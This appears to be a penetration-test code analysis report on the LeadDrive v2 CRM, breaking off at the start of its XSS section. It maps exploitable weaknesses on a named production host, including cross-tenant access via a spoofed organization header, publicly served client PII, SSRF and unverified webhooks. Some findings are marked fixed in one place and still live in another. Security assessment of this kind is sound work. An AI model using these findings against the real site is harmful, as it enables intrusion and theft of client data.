# LeadDrive v2 — Penetration Test Code Analysis Deliverable

**Application:** LeadDrive v2 CRM
**Target URL:** `v2.leaddrivecrm.org`
**Production Server:** `[REDACTED]` (Hetzner VDS)
**Analysis Date:** 2026-03-27
**Analyst:** Code Analysis Agent (Pre-Recon Phase)

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the LeadDrive v2 application.

### In-Scope: Network-Reachable Components
- All Next.js page routes and API route handlers served by the application
- Public/unauthenticated API endpoints under `/api/v1/public/*`, `/api/v1/webhooks/*`, `/api/v1/calendar/feed/*`
- Authenticated CRM API endpoints under `/api/v1/*`, `/api/budgeting/*`, `/api/cost-model/*`
- Customer portal pages and API endpoints under `/portal/*`
- Static files served from `/public/` directory (including `/public/data/` and `/public/uploads/`)
- FastAPI compute sidecar at port 8000 (exposed to host network via docker-compose)
- Marketing/landing pages served by the application

### Out-of-Scope: Locally Executable Only
- `scripts/deploy.sh` — SSH deployment script (CLI-only, but contains committed production secrets that ARE in-scope as informational findings)
- `scripts/create-admin.ts`, `scripts/import-v1.ts` — CLI database seeding tools
- `migration_data/migrate.py`, `cost_model_migration_data/migrate_cost_model.py` — Python migration scripts
- `telegram-bridge/bot.js` — Long-polling Telegram bot (no HTTP listener), but its hardcoded token is an informational finding
- `prisma/seed.ts` — Database seeding script
- Build tooling, ESLint config, TypeScript config

---

## 1. Executive Summary

LeadDrive v2 is a multi-tenant CRM application built with Next.js 16, React 19, Prisma ORM (PostgreSQL), and a Python FastAPI compute sidecar. The application serves organizations with lead management, invoicing, budgeting, knowledge base, customer portal, and AI-powered features. The attack surface is extensive — over 150 API endpoints are network-accessible, with approximately 20 requiring no authentication at all.

**The application has critical security deficiencies that would allow immediate compromise.** The most severe findings are: (1) a known, weak `NEXTAUTH_SECRET` deployed to production that enables JWT forgery and full impersonation of any user (FIXED); (2) hardcoded default admin credentials that are reset on every deployment (FIXED — now uses env var); (3) a cross-tenant data access bypass via a manipulable `x-organization-id` header that any authenticated user can exploit; and (4) real client financial/legal PII (tax IDs, bank accounts, SWIFT codes, director names) served as unauthenticated static JSON files at predictable URLs.

Additional high-impact findings include: no webhook signature verification on WhatsApp/Facebook POST handlers (allowing arbitrary message injection), an SSRF vulnerability in the SMTP test endpoint that bypasses the existing `isPrivateHost()` protection used elsewhere, multiple stored XSS vectors through unsanitized HTML template generation (invoices, emails, offers), a Content Security Policy rendered useless by `'unsafe-eval' 'unsafe-inline'` directives, contract files uploaded to the publicly-served `public/` directory without access control, and TOTP secrets/backup codes/reset tokens stored in plaintext in the database. The combination of these vulnerabilities means an external attacker can likely achieve full administrative access, cross-tenant data exfiltration, and persistent XSS within a single engagement session.

---

## 2. Architecture & Technology Stack

### Framework & Language

LeadDrive v2 is a **Next.js 16.1.7** application using the App Router pattern with React 19.2.3, running on **Node.js 20 Alpine** in Docker. TypeScript is used with `strict: true`, but critically, `next.config.ts` sets `typescript.ignoreBuildErrors: true`, meaning type errors are silently swallowed at build time — this masks potential logic errors that could have security implications. The application uses **standalone output mode** for deployment.

The data layer consists of **PostgreSQL 16** via **Prisma 6.x ORM** and **Redis 7** (referenced but the in-app rate limiter uses an in-memory `Map` instead). A **Python 3.12 FastAPI** sidecar (`services/compute/`) handles cost model analytics computation and runs with `uvicorn --reload` even in the production Docker image — enabling hot-reload in production is a security concern as it monitors the filesystem for changes.

**Key dependencies with security implications:**
- `next-auth@5.0.0-beta.30` — Pre-release version, likely contains unfixed CVEs
- `isomorphic-dompurify` — HTML sanitization (used inconsistently)
- `zod` — Input validation (applied to some but not all endpoints)
- `bcryptjs` — Password hashing (inconsistent cost factors: 12 in most places, 10 in admin user update)
- `jose` — Portal JWT handling (HS256)
- `otplib` — TOTP 2FA implementation
- `nodemailer` — Email sending with user-configurable SMTP
- `@anthropic-ai/sdk` — Claude AI integration
- `exceljs` — Excel file generation/parsing

### Architectural Pattern

The application follows a **hybrid monolith + sidecar** pattern:

```
Internet → Nginx (port 80, HTTP only) → Next.js (port 3001/3000) → PostgreSQL (5432)
                                                                  → Redis (6379)
                                                                  → FastAPI Compute (8000)
```

**Trust boundary analysis:** The Next.js middleware (`src/middleware.ts`) is the sole perimeter check for the web application. The compute service has **zero authentication** — it relies entirely on Docker network isolation, but `docker-compose.yml` exposes port 8000 directly to the host (`0.0.0.0:8000`). All three backend services (PostgreSQL, Redis, Compute) are exposed on host ports in the docker-compose configuration, creating a flat trust model where any host-network access compromises all services. Redis runs with no password.

### Critical Security Components

- **Authentication:** Credentials-only provider via NextAuth v5 beta, with optional TOTP 2FA
- **Authorization:** Role-based (admin, manager, sales, support, viewer) with permission matrix
- **Session:** Stateless JWT cookies managed by NextAuth; separate portal JWT via `jose`
- **Tenant Isolation:** `organizationId` foreign key on all models, but `getOrgId()` trusts a client-manipulable header
- **Rate Limiting:** In-memory Map, applied only to auth endpoints, resets on restart
- **Security Headers:** CSP, HSTS, X-Frame-Options configured in `next.config.ts` (but CSP is weakened by `unsafe-eval`/`unsafe-inline`)
- **Input Sanitization:** DOMPurify for HTML rendering (inconsistently applied); Zod schemas on some endpoints

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms

The application uses **NextAuth v5 beta** (`next-auth@5.0.0-beta.30`) with a **Credentials-only provider** — no OAuth/OIDC/SSO providers are configured. Authentication is handled in `src/lib/auth.ts` with a JWT session strategy. The login flow accepts `email`, `password`, and optional `totpCode` fields, validated via a Zod schema (`loginSchema`) requiring a valid email and minimum 6-character password. Password hashing uses **bcryptjs** with cost factor 12 (except for admin-initiated password changes in `src/app/api/v1/users/[id]/route.ts` line 73, which uses cost factor 10 — an inconsistency).

**TOTP 2FA** is optional per-user, implemented via `otplib`. The middleware enforces 2FA completion by redirecting to `/login/verify-2fa` or `/login/setup-2fa`, but this is a redirect-only enforcement — the API itself does not independently block requests from sessions that haven't completed 2FA verification. Backup codes (8 codes, `crypto.randomBytes(4).toString("hex")`) are stored as plaintext JSON in the database. TOTP secrets are also stored in plaintext in the `User.totpSecret` column.

**Portal authentication** uses a separate JWT system via `jose` (HS256, signed with the same `NEXTAUTH_SECRET`). Portal tokens are stored in a `portal-token` cookie with 7-day expiry. The portal serves a customer-facing ticketing and knowledge base system.

### Authentication API Endpoints (Exhaustive List)

| Endpoint | Method | Auth Required | Purpose |
|----------|--------|---------------|---------|
| `POST /api/auth/[...nextauth]` | POST | No | NextAuth sign-in (credentials) |
| `GET /api/auth/[...nextauth]` | GET | No | NextAuth session/CSRF/providers |
| `POST /api/v1/auth/register` | POST | No | New org + admin user registration |
| `POST /api/v1/auth/forgot-password` | POST | No | Request password reset email |
| `POST /api/v1/auth/reset-password` | POST | No | Consume reset token, set new password |
| `GET/POST /api/v1/auth/2fa` | GET/POST | Session | 2FA status / setup / verify / disable |
| `POST /api/v1/auth/verify-2fa` | POST | Session | Verify TOTP code post-login |
| `POST /api/v1/auth/totp/setup` | POST | Session | Generate TOTP QR + secret |
| `POST /api/v1/auth/totp/verify` | POST | Session | Activate TOTP + generate backup codes |
| `POST /api/v1/auth/totp/disable` | POST | Session | Disable TOTP (requires password) |
| `GET /api/v1/auth/totp/status` | GET | Session | Check TOTP enrollment status |
| `POST /api/v1/public/portal-auth` | POST | No | Portal contact login |
| `DELETE /api/v1/public/portal-auth` | DELETE | No | Portal logout (clears cookie) |
| `POST /api/v1/public/portal-auth/register` | POST | No | Portal self-registration |
| `GET/POST /api/v1/public/portal-auth/set-password` | GET/POST | No | Portal password setup via invite token |

### Session Management & Cookie Configuration

**NextAuth Session (Main App):** Stateless JWT stored in a cookie managed by NextAuth. The JWT payload includes `role`, `organizationId`, `organizationName`, `plan`, `needs2fa`, and `needsSetup2fa`. The session secret is `NEXTAUTH_SECRET`. No explicit `secure` flag override is configured in `auth.ts` — cookie security depends on NextAuth's default behavior based on the `NEXTAUTH_URL` scheme.

**Portal Session Cookie** — Configured at `src/app/api/v1/public/portal-auth/route.ts` line 70:
```
cookies.set("portal-token", token, { httpOnly: true, path: "/", maxAge: 86400 * 7, sameSite: "lax" })
```
- `httpOnly: true` ✓
- `sameSite: "lax"` ✓
- **`secure` flag: MISSING** — cookie can be transmitted over HTTP
- Same configuration at `src/app/api/v1/public/portal-auth/set-password/route.ts` line 100

**CSRF Protection:** No explicit CSRF middleware or token validation exists in custom API routes. NextAuth v5 provides built-in CSRF protection for its own endpoints, but all custom `/api/v1/*` routes lack CSRF defenses. Since the session uses `sameSite: "lax"` (not `strict`), cross-site GET requests will include the session cookie.

### Authorization Model & Bypass Scenarios

**Role-Based Access Control** is defined in `src/lib/permissions.ts` with a static permission matrix mapping 5 roles (admin, manager, sales, support, viewer) to actions (read, write, delete, export, admin) across 23 modules. The `requireAuth()` function in `src/lib/api-auth.ts` enforces both authentication and permission checks.

**Critical bypass — `getOrgId()` header trust** (`src/lib/api-auth.ts` lines 43-44):
```typescript
const fromHeader = req.headers.get("x-organization-id")
if (fromHeader) return fromHeader   // Returns immediately without session cross-check
```
The middleware injects `x-organization-id` from the authenticated session, but `getOrgId()` reads this header without verifying it matches the session's `organizationId`. An authenticated user can supply `x-organization-id: <victim-org-id>` to access another organization's data on any endpoint that uses `getOrgId()` instead of `requireAuth()`.

**Missing role enforcement on user management:** `src/app/api/v1/users/[id]/route.ts` — PUT and DELETE on user records only check `getOrgId()` (org membership), not whether the caller has admin role. Any authenticated viewer can modify other users' roles, passwords, or 2FA settings.

**Plan-based feature gating bypass:** In `src/middleware.ts` line 105, the plan defaults to `"enterprise"` if missing: `const plan = session?.user?.plan || "enterprise"`. A missing plan field grants maximum feature access. API routes are explicitly excluded from plan gating.

### Multi-Tenancy Security

All major data models include `organizationId` as a foreign key, and API routes consistently scope queries with `where: { organizationId: orgId }`. However, the `tenantPrisma()` extension in `src/lib/prisma.ts` that auto-injects organizationId is **not used by any API route** — all routes use the base `prisma` client and scope manually, creating risk of developer oversight. The `x-organization-id` header trust issue (above) is the primary tenant isolation bypass vector.

### SSO/OAuth/OIDC

No OAuth or OIDC providers are configured. The `.env.example` references `GOOGLE_CLIENT_ID` and `GOOGLE_CLIENT_SECRET`, but these are not wired into `auth.ts`. No state parameter validation, nonce handling, or callback URL verification exists because no external IdP integration is implemented.

---

## 4. Data Security & Storage

### Database Security

The application uses **PostgreSQL 16** via **Prisma 6.x ORM**. The schema (`prisma/schema.prisma`) defines comprehensive data models with `organizationId` foreign keys for tenant isolation. However, several critical sensitive fields lack encryption at rest:

| Field | Model | Storage | Risk |
|-------|-------|---------|------|
| `totpSecret` | User | Plaintext `String` | DB breach → bypass all 2FA |
| `backupCodes` | User | Plaintext `Json` | DB breach → bypass 2FA via backup codes |
| `resetToken` | User | Plaintext `String` | DB breach → account takeover via password reset |
| `portalPasswordHash` | Contact | bcrypt hash ✓ | Properly hashed |
| `portalVerificationToken` | Contact | Plaintext `String` | DB breach → portal account takeover |
| `settings.smtp.smtpPass` | Organization | Plaintext in JSON blob | DB breach → SMTP credential theft |
| `botToken`, `apiKey`, `appSecret` | ChannelConfig | Plaintext `String` | DB breach → messaging platform takeover |
| `calendarToken` | User | Plaintext `String` | Token leak → org-wide task data exposure |

Password reset tokens are generated with `crypto.randomBytes(32).toString("hex")` (adequate entropy) but stored in plaintext. Best practice is to store a hash of the token and compare hashes on validation.

SQL injection risk is minimal — Prisma's query builder parameterizes all queries, and the one `$queryRaw` usage in `src/app/api/budgeting/snapshot/route.ts` uses Prisma's tagged template literal form (safe parameterization). No `$queryRawUnsafe` or `$executeRawUnsafe` calls were found.

### Data Flow Security

**Publicly Exposed PII (CRITICAL):** The `public/data/` directory contains real client data served without authentication:
- `public/data/company_details.json` — Real company names, tax IDs (VOEN), director names, physical addresses, bank names, IBAN/account numbers, SWIFT codes for dozens of Azerbaijani companies
- `public/data/company_legal_names.json` — Legal entity names
- `public/data/pricing_data.json` — Pricing data
- `public/data/pricing_crm_mapping.json` — CRM mapping data

These are accessible at `https://v2.leaddrivecrm.org/data/company_details.json` without any authentication. This constitutes a data breach exposure of real client financial and legal information.

**Migration data in git:** `migration_data/company_details.json` and `cost_model_migration_data/` contain additional real client data (employee counts, salary data, contract pricing) committed to the repository. Any contributor has access.

**Email logging:** Full HTML email bodies (including password reset links and portal verification tokens) are logged to the `EmailLog` table (`prisma/schema.prisma` lines 1033-1048). A database read yields active reset URLs and verification tokens.

**Contract file uploads:** Files are written to `public/uploads/contracts/` with randomized filenames (`crypto.randomBytes(16).toString("hex")` + original extension). While the 16-byte random prefix provides 128 bits of entropy, the files are served statically without any authentication check — anyone who obtains or guesses the URL can download the contract document.

### Channel Config Secret Exposure

The `GET /api/v1/channels/:id` endpoint (`src/app/api/v1/channels/[id]/route.ts` lines 29-33) returns the full database row including `botToken`, `apiKey`, and `appSecret` fields. The list endpoint correctly excludes these via Prisma `select`, but the detail endpoint does not. Any authenticated user (including `viewer` role) can retrieve messaging platform credentials.

### Multi-Tenant Data Isolation

Queries are consistently scoped by `organizationId`, but the `x-organization-id` header trust issue described in Section 3 represents the primary cross-tenant data access vector. The calendar feed endpoint (`/api/v1/calendar/feed/[token]`) returns all tasks for the token owner's **entire organization** rather than just the individual user's tasks — a scope creep that leaks organizational data through a single user's calendar subscription.

---

## 5. Attack Surface Analysis

### External Entry Points — Public/Unauthenticated

The middleware (`src/middleware.ts`) explicitly bypasses authentication for paths matching `/api/v1/public/*`, `/api/v1/calendar/feed/*`, `/api/v1/webhooks/*`, and `/api/v1/journeys/process`. The following endpoints require no authentication:

**Web-to-Lead Submission — `POST /api/v1/public/leads`** (`src/app/api/v1/public/leads/route.ts`)
- Sets `Access-Control-Allow-Origin: *` — fully open CORS
- Accepts JSON with `org_slug` to route leads; if slug doesn't match, **falls back to the first organization in the database**
- No rate limiting applied
- Attack vector: Spam any organization with fake leads; the fallback logic means even without knowing a valid slug, leads are created

**Webhook Endpoints — No Signature Verification:**
- `POST /api/v1/webhooks/whatsapp` — GET verification uses a token, but POST handler has **no HMAC signature verification** of Meta's `X-Hub-Signature-256`. Any historical default verify token is redacted; production must use a unique environment value.
- `POST /api/v1/webhooks/facebook` — Same pattern: POST handler lacks signature verification. Default verify token: `"leaddrive_fb_verify"` (hardcoded)
- `POST /api/v1/webhooks/telegram` — Bot token passed as URL query parameter (`?token=...`), logged in access logs
- `POST /api/v1/webhooks/vkontakte` — VK group_id matched against DB; confirmation code from DB

**Portal Authentication (No Rate Limiting):**
- `POST /api/v1/public/portal-auth` — Login endpoint reveals account existence (404 "not found" vs 403 "not activated")
- `POST /api/v1/public/portal-auth/register` — Distinct error messages enable full user enumeration ("contact not found" vs "access not enabled" vs "already registered")
- `POST /api/v1/public/portal-auth/set-password` — Token-gated password setup

**Other Public Endpoints:**
- `POST /api/v1/public/portal-tickets` — Create/list portal tickets (portal JWT required)
- `POST /api/v1/public/portal-chat` — AI chat for portal users
- `GET /api/v1/public/portal-kb` — Public knowledge base articles
- `GET/POST /api/v1/public/events/[id]/register` — Event self-registration
- `GET /api/v1/calendar/feed/[token]` — iCal feed, scoped to entire org (not just user)
- `POST /api/v1/journeys/process` — Cron endpoint using `Bearer <CRON_SECRET>` token

**Static Files (No Auth):**
- `/data/company_details.json` — Real client PII/financial data
- `/uploads/contracts/*` — Uploaded contract files with randomized names

### External Entry Points — Authenticated

The application exposes **150+ authenticated API endpoints** across these functional areas:

| Module | Key Endpoints | Notable Security Concerns |
|--------|--------------|---------------------------|
| **CRM Core** | `/api/v1/contacts`, `/api/v1/leads`, `/api/v1/deals`, `/api/v1/companies` | Bulk delete endpoints, no role check on some operations |
| **Communication** | `/api/v1/inbox`, `/api/v1/campaigns/[id]/send`, `/api/v1/whatsapp/send` | HTML injection in email bodies (unsanitized) |
| **Tickets** | `/api/v1/tickets`, `/api/v1/tickets/ai` | AI-powered reply suggestions |
| **Finance** | `/api/v1/invoices`, `/api/v1/invoices/[id]/pdf`, `/api/v1/invoices/[id]/send` | Invoice HTML generation with XSS sinks |
| **Pricing** | `/api/v1/pricing/*`, `/api/v1/price-changes` | Batch price change operations |
| **Contracts** | `/api/v1/contracts/[id]/files` | **File upload** (10MB max, written to `public/`) |
| **Budgeting** | `/api/budgeting/*` (40+ endpoints) | Excel/CSV import, AI narrative generation |
| **Cost Model** | `/api/cost-model/*` | Analytics computation via unauthenticated FastAPI sidecar |
| **AI Features** | `/api/v1/ai/*`, `/api/v1/ai-configs`, `/api/v1/ai-guardrails` | Anthropic API integration, configurable AI agents |
| **User Management** | `/api/v1/users/[id]` | **Missing admin role check** — any user can modify others |
| **Settings** | `/api/v1/settings/smtp/test` | **SSRF vulnerability** — no private host check |
| **Channels** | `/api/v1/channels/[id]` | Returns full bot tokens/API keys to any authenticated user |

### Input Validation Patterns

Input validation is **inconsistent**. Zod schemas are applied to authentication endpoints, the web-to-lead form, pipeline stage operations, and user updates. However, the majority of API routes perform minimal or no structured validation:

- **Invoice/email HTML generation:** User-controlled fields (`item.name`, `item.description`, `customMessage`, `offer.notes`) are interpolated directly into HTML template literals without any escaping or sanitization
- **Email template storage:** `htmlBody` is stored as raw HTML with no sanitization at the API layer (`src/app/api/v1/email-templates/route.ts`)
- **Journey automation:** Step `config.body` is used directly in email HTML (`src/lib/journey-engine.ts`)
- **Contact/company fields:** Some routes use `sanitizedStringSchema` (strips `<>` characters), but this is not universally applied

### Background Processing

- **Journey cron processor** (`/api/v1/journeys/process`): Protected by `CRON_SECRET` Bearer token. If the secret is weak or leaked, any caller can trigger automated email sends and lead status changes
- **Self-invoking cron** (`src/instrumentation.ts`): The app calls itself via `fetch()` to trigger journey processing on a 5-minute interval
- **Recurring invoice generation** (`/api/v1/recurring-invoices/generate`): Manually triggered, requires authentication

### Notable Out-of-Scope Components

- `scripts/deploy.sh` — CLI deployment script (not network-accessible, but contains production credentials)
- `scripts/create-admin.ts` — CLI admin creation tool
- `scripts/import-v1.ts` — V1 data import tool
- `migration_data/migrate.py` — Python migration script
- `telegram-bridge/bot.js` — Telegram bot using long-polling (not HTTP webhook)

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Critical: Secrets committed to version control.** The following secrets are hardcoded in tracked files:

| Secret | Location | Status |
|--------|----------|--------|
| NEXTAUTH_SECRET | `.env` | **FIXED** — strong secret set on production |
| PostgreSQL credentials | `.env` | **FIXED** — removed from scripts, uses env vars |
| Default admin credentials | `scripts/create-admin.ts` | **FIXED** — uses ADMIN_PASSWORD env var |
| Telegram bot token | `telegram-bridge/bot.js` | Uses env var |
| WhatsApp verify token | `src/app/api/v1/webhooks/whatsapp/route.ts` | **FIXED** — requires env var, no fallback |
| Facebook verify token | `src/app/api/v1/webhooks/facebook/route.ts` | **FIXED** — requires env var, no fallback |
| Production server IP | `scripts/deploy.sh` | **FIXED** — uses DEPLOY_SERVER env var |

The `.env` file is in `.gitignore` but the file at `.env` in the working directory contains the weak production secret. The `scripts/deploy.sh` deploys this exact secret to the production server.

### Configuration Security — Security Headers

**Next.js security headers** (`next.config.ts`), applied to all routes:

| Header | Value | Assessment |
|--------|-------|------------|
| `X-Frame-Options` | `DENY` | ✓ Good — prevents clickjacking |
| `X-Content-Type-Options` | `nosniff` | ✓ Good |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | ✓ Good |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | ⚠ Missing `preload` directive |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | ✓ Good |
| `X-XSS-Protection` | `1; mode=block` | ⚠ Deprecated, but harmless |
| `Content-Security-Policy` | See below | ✗ Critically weakened |

**CSP Analysis:**
```
default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self' https:; frame-ancestors 'none'
```
- `script-src 'unsafe-eval' 'unsafe-inline'` — **Renders CSP useless against XSS.** Any injected script executes.
- `connect-src 'self' https:` — Allows data exfiltration to any HTTPS endpoint
- `img-src 'self' data: blob: https:` — Allows image-based exfiltration to any HTTPS endpoint

**Nginx configuration** (deployed via `scripts/deploy.sh` lines 178-195):
- **HTTP only** — No TLS configuration; no SSL certificate at proxy level
- No security headers at Nginx level (delegated entirely to Next.js)
- `proxy_read_timeout 86400` — 24-hour timeout enables slowloris-style attacks
- No rate limiting at Nginx level
- No `proxy_hide_header Server;` — server fingerprinting enabled
- HSTS header set by Next.js is only effective after a first HTTPS visit, but Nginx doesn't serve HTTPS

### External Dependencies

| Service | Integration Point | Security Concern |
|---------|-------------------|------------------|
| Anthropic Claude API | `src/app/api/v1/ai/*`, ticket AI, portal chat | API key in env; user input flows into AI prompts |
| WhatsApp Cloud API | `src/lib/whatsapp.ts` | Access token in channel config; no webhook signature verification |
| Facebook Messenger API | Webhook handler | No POST signature verification |
| Telegram Bot API | Webhook handler + `telegram-bridge/bot.js` | Bot token hardcoded in source |
| Nodemailer (SMTP) | `src/lib/email.ts` | User-configurable SMTP; test endpoint lacks SSRF protection |
| FastAPI Compute | `src/lib/compute.ts` | No authentication; exposed on host port 8000 |

### Monitoring & Logging

- **Audit log** (`src/app/api/v1/audit-log/route.ts`): Records user actions per organization. The `AuditLog` model stores `action`, `module`, `userId` — but the `details` field referenced in portal auth code (`portal-auth/route.ts` line 46) **does not exist in the schema**, causing portal audit entries to silently fail.
- **Email log** (`src/lib/email.ts`): Stores full HTML email bodies including password reset links and verification tokens — sensitive data in logs.
- **Console logging**: Various `console.error` and `console.log` calls throughout API routes for debugging, but no structured logging framework.
- **No intrusion detection**, no anomaly alerting, no failed authentication monitoring beyond the audit log.

---

## 7. Overall Codebase Indexing

The LeadDrive v2 codebase follows the standard Next.js App Router convention with the primary application code under `src/`. The `src/app/` directory contains both page routes (organized by layout groups: `(dashboard)`, `(marketing)`, `(public)`, `(auth)`, `portal`, `admin`) and API routes under `src/app/api/`. API routes are further organized into versioned paths (`api/v1/`), budgeting endpoints (`api/budgeting/`), and cost model endpoints (`api/cost-model/`). The `src/lib/` directory contains shared utilities including authentication (`auth.ts`, `api-auth.ts`, `portal-auth.ts`), email handling (`email.ts`, `invoice-html.ts`), rate limiting (`rate-limit.ts`), URL validation (`url-validation.ts`), and the Prisma client (`prisma.ts`). Components are organized under `src/components/` with UI primitives in `src/components/ui/` (shadcn/ui pattern).

The `services/compute/` directory houses the Python FastAPI sidecar with its own Dockerfile. The `telegram-bridge/` directory contains a standalone Node.js Telegram bot. The `scripts/` directory contains deployment, migration, and administrative scripts — notably `deploy.sh` which contains production infrastructure details and credentials. The `prisma/` directory contains the database schema, seed data, and Prisma configuration. The `public/` directory serves static assets and, critically, contains exposed data files (`public/data/`) and uploaded contract files (`public/uploads/contracts/`). The `migration_data/` and `cost_model_migration_data/` directories contain real client data used for V1→V2 migration. The `messages/` directory contains i18n translation files (en, ru, az). The `docs/` directory contains product documentation and specification files. No API schema files (OpenAPI, Swagger, GraphQL) were found — there is no machine-readable API specification.

---

## 8. Critical File Paths

### Configuration
- `next.config.ts` — Security headers, CSP, TypeScript config (ignoreBuildErrors)
- `Dockerfile` — Node.js 20 Alpine build
- `docker-compose.yml` — Service orchestration, hardcoded credentials, exposed ports
- `prisma/schema.prisma` — Full database schema with sensitive field definitions
- `prisma/prisma.config.ts` — Prisma configuration
- `.env.example` — Expected environment variables
- `.env` — Active environment file (gitignored but present, contains weak NEXTAUTH_SECRET)
- `package.json` — Dependencies including next-auth beta
- `components.json` — shadcn/ui configuration
- `eslint.config.mjs` — ESLint configuration
- `tsconfig.json` — TypeScript configuration

### Authentication & Authorization
- `src/lib/auth.ts` — NextAuth configuration, credentials provider, JWT callbacks, TOTP verification
- `src/lib/api-auth.ts` — `getOrgId()`, `requireAuth()`, `getSession()` — **critical: header trust vulnerability**
- `src/lib/portal-auth.ts` — Portal JWT signing/verification (HS256, jose)
- `src/lib/permissions.ts` — RBAC permission matrix
- `src/lib/plan-config.ts` — Plan-based feature gating
- `src/middleware.ts` — Request interception, auth enforcement, rate limiting, header injection
- `src/app/api/auth/[...nextauth]/route.ts` — NextAuth handler
- `src/app/api/v1/auth/register/route.ts` — User/org registration
- `src/app/api/v1/auth/forgot-password/route.ts` — Password reset request
- `src/app/api/v1/auth/reset-password/route.ts` — Password reset completion
- `src/app/api/v1/auth/verify-2fa/route.ts` — 2FA verification
- `src/app/api/v1/auth/2fa/route.ts` — 2FA setup/verify/disable
- `src/app/api/v1/auth/totp/setup/route.ts` — TOTP QR/secret generation
- `src/app/api/v1/auth/totp/verify/route.ts` — TOTP activation + backup codes
- `src/app/api/v1/auth/totp/disable/route.ts` — TOTP disable
- `src/app/api/v1/auth/totp/status/route.ts` — TOTP status check
- `src/app/api/v1/public/portal-auth/route.ts` — Portal login/logout
- `src/app/api/v1/public/portal-auth/register/route.ts` — Portal registration
- `src/app/api/v1/public/portal-auth/set-password/route.ts` — Portal password setup

### API & Routing
- `src/app/api/v1/public/leads/route.ts` — Web-to-lead (open CORS, org slug fallback)
- `src/app/api/v1/webhooks/whatsapp/route.ts` — WhatsApp webhook (no signature verification)
- `src/app/api/v1/webhooks/facebook/route.ts` — Facebook webhook (no signature verification)
- `src/app/api/v1/webhooks/telegram/route.ts` — Telegram webhook
- `src/app/api/v1/webhooks/vkontakte/route.ts` — VK webhook
- `src/app/api/v1/calendar/feed/[token]/route.ts` — Calendar feed (org-wide scope)
- `src/app/api/v1/journeys/process/route.ts` — Journey cron processor
- `src/app/api/v1/users/[id]/route.ts` — User management (missing role check)
- `src/app/api/v1/channels/[id]/route.ts` — Channel config (exposes full tokens)
- `src/app/api/v1/invoices/[id]/pdf/route.ts` — Invoice PDF generation
- `src/app/api/v1/invoices/[id]/send/route.ts` — Invoice email send
- `src/app/api/v1/invoices/[id]/act/route.ts` — Completion act generator
- `src/app/api/v1/inbox/route.ts` — Inbox/email send (HTML injection)
- `src/app/api/v1/offers/[id]/send/route.ts` — Offer email send (HTML injection)
- `src/app/api/v1/campaigns/[id]/send/route.ts` — Campaign email send
- `src/app/api/v1/contracts/[id]/files/route.ts` — File upload/download
- `src/app/api/v1/settings/smtp/test/route.ts` — SMTP test (SSRF vulnerability)
- `src/app/api/v1/settings/smtp/route.ts` — SMTP settings (plaintext password storage)
- `src/app/api/v1/settings/roles/route.ts` — Role management
- `src/app/api/v1/settings/permissions/route.ts` — Permission management
- `src/app/api/v1/ai/recommend/route.ts` — AI recommendations
- `src/app/api/v1/public/portal-tickets/route.ts` — Portal ticket management
- `src/app/api/v1/public/portal-chat/route.ts` — Portal AI chat
- `src/app/api/v1/public/events/[id]/register/route.ts` — Event registration
- `src/app/api/v1/plan-requests/route.ts` — Plan upgrade requests (HTML injection in email)
- `src/app/api/v1/email-templates/route.ts` — Email template CRUD (raw HTML storage)
- `src/app/api/v1/organization/plan/route.ts` — Organization plan management

### Data Models & DB Interaction
- `prisma/schema.prisma` — Full schema (sensitive fields analysis in Section 4)
- `prisma/seed.ts` — Database seeding

### Dependency Manifests
- `package.json` — Node.js dependencies
- `package-lock.json` — Locked dependency versions
- `telegram-bridge/package.json` — Telegram bot dependencies
- `services/compute/requirements.txt` (if exists) — Python dependencies

### Sensitive Data & Secrets Handling
- `src/lib/email.ts` — Email sending, SMTP config, `isPrivateHost()` SSRF check, email logging
- `src/lib/invoice-html.ts` — Invoice HTML generation (XSS sinks)
- `src/lib/url-validation.ts` — `isPrivateUrl()`, `isPrivateHost()` SSRF protection
- `src/lib/sanitize.ts` — DOMPurify configuration for `sanitizeRichHtml()`
- `public/data/company_details.json` — **Exposed real client PII/financial data**
- `public/data/company_legal_names.json` — Exposed legal entity names
- `migration_data/company_details.json` — Client data in git
- `cost_model_migration_data/cost_employees.json` — Employee/salary data in git
- `telegram-bridge/bot.js` — Hardcoded Telegram bot token

### Middleware & Input Validation
- `src/middleware.ts` — Main request middleware
- `src/lib/rate-limit.ts` — In-memory rate limiter
- `src/lib/sanitize.ts` — DOMPurify-based HTML sanitizer

### Logging & Monitoring
- `src/app/api/v1/audit-log/route.ts` — Audit log API
- `src/lib/email.ts` — Email logging (sensitive data in logs)
- `src/instrumentation.ts` — Self-invoking cron for journey processing

### Infrastructure & Deployment
- `Dockerfile` — Application container build
- `docker-compose.yml` — Multi-service orchestration
- `scripts/deploy.sh` — Production deployment script (credentials, server IP, Nginx config)
- `scripts/create-admin.ts` — Admin account creation (default credentials)
- `scripts/import-v1.ts` — V1 data import
- `services/compute/main.py` — FastAPI compute sidecar (no auth)
- `services/compute/Dockerfile` — Compute service container

### Frontend Components with Security Relevance
- `src/components/email-template-form.tsx` — Email template editor (`innerHTML` sink)
- `src/app/(dashboard)/email-log/page.tsx` — Email log display (`dangerouslySetInnerHTML` with DOMPurify)
- `src/app/portal/knowledge-base/page.tsx` — Portal KB (`dangerouslySetInnerHTML` with DOMPurify)
- `src/app/(dashboard)/knowledge-base/[id]/page.tsx` — KB article display
- `src/components/profitability/ai-observations.tsx` — AI observations display

### External Service Integration
- `src/lib/whatsapp.ts` — WhatsApp Cloud API integration
- `src/lib/webhooks.ts` — Outbound webhook dispatch (`isPrivateUrl()` check, DNS rebinding bypass risk)
- `src/lib/compute.ts` — Compute sidecar client
- `src/lib/journey-engine.ts` — Journey automation engine (HTML injection in emails)

---

## 9. XSS Sinks and Render Contexts

### Server-Side HTML Injection (Template Literals — No Sanitization)

These are the most critical XSS findings. All involve user-controlled data interpolated directly into HTML strings served as email bodies, invoice documents, or completion acts. **Zero HTML escaping is applied.**

#### Sink 1: `generateInvoiceHtml()` — Invoice HTML Generation
**File:** `src/lib/invoice-html.ts`, lines 148–242
**Render Context:** HTML Body — full HTML document served as `text/html` at `/api/v1/invoices/[id]/pdf` and sent as email attachment
**Sanitization:** None

User-controlled fields injected raw into HTML template literals:
